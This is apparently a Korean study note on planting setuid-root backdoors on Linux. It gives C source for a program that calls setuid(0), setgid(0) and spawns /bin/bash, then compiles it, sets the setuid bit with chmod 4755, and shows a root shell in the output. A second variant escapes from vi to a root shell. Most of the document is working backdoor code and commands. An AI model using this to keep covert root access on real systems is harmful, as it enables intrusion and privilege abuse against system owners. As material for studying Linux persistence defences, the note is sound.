# Backdoor Attack

```
-rwxr-xr-x. 1 root root 1389024 Apr 30 20:30 /bin/bash
# setUIDbit가 설정되어 있지 않음
chmod 4755 ./bash
# bash 파일에 setUIDbit 설정
[root@Linux1 test]# su test
[test@Linux1 test]$ id
uid=1000(test) gid=1000(test) groups=1000(test) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
[test@Linux1 test]$ ./bash
bash-5.1$ id
uid=1000(test) gid=1000(test) groups=1000(test) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
# 이후에 root 권한이 지속되지 않는다.
```

## C로 간단한 백도어 만들기

```c
#include <stdio.h>

// fun_main
int main(int argc, char* argv[])
{
        setuid(0);      // UID 설정
        setgid(0);      // GID 설정
        system("/bin/bash");    // bash 쉘 실행(root권한 탈취)
        return 0;
}
```

{% stepper %}
{% step %}
### 컴파일

```
gcc -o backdoor backdoor.c
```
{% endstep %}

{% step %}
### setUIDbit 설정

```
chmod 4755 backdoor
```
{% endstep %}

{% step %}
### 실행결과

```
[test@Linux1 test]$ id
uid=1000(test) gid=1000(test) groups=1000(test) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
[test@Linux1 test]$ ./backdoor
[root@Linux1 test]# id
uid=0(root) gid=0(root) groups=0(root),1000(test) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
# root 권한을 탈취 하는데 성공했다.
```
{% endstep %}
{% endstepper %}

## vim 명령어 모드를 활용한 백도어

```c
#include <stdio.h>

// fun_main
int main(int argc, char* argv[])
{
        setuid(0);      // UID 설정
        setgid(0);      // GID 설정
        system("/usr/bin/vi");  // vim 실행
        return 0;
}
```

{% stepper %}
{% step %}
컴파일 후 SetUIDBit 설정 > 실행
{% endstep %}

{% step %}
명령 모드에서 다음을 실행:

```
:!/bin/bash
```
{% endstep %}

{% step %}
vim은 계속 실행 중인 상태로 유지되고 관리자 권한을 가진 상태로 쉘을 사용하게 된다.
{% endstep %}
{% endstepper %}
